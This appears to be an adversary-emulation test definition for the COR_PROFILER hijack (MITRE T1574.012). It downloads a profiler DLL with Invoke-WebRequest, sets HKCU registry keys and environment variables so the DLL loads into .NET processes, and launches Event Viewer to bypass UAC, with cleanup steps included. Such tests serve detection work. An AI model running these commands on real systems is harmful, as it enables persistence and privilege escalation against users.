api_version: "2.0"
name: User scope COR_PROFILER
description: |
    Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.
    Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
    If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,
    the notepad process will not execute with high integrity.

    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
args:
    - name: file_name
      type: path
      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
    - name: clsid_guid
      type: string
      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
uuid: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1574: Hijack Execution Flow'
    subtechniques:
        - 'T1574.012: COR_PROFILER'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        "#{file_name}" must be present
      inline: |
        if (Test-Path "#{file_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
        }}
      executor: powershell
    - name: user-scope-cor_profiler
      inline: |
        Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{{.Args.clsid_guid}}" -ForegroundColor Cyan
        New-Item -Path "HKCU:\Software\Classes\CLSID\{{.Args.clsid_guid}}\InprocServer32" -Value "{{.Args.file_name}}" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{{.Args.clsid_guid}}" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "{{.Args.file_name}}" -Force | Out-Null
        Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
        START MMC.EXE EVENTVWR.MSC
      executor: powershell
      cleanup:
        inline: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{{.Args.clsid_guid}}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n"
        executor: powershell
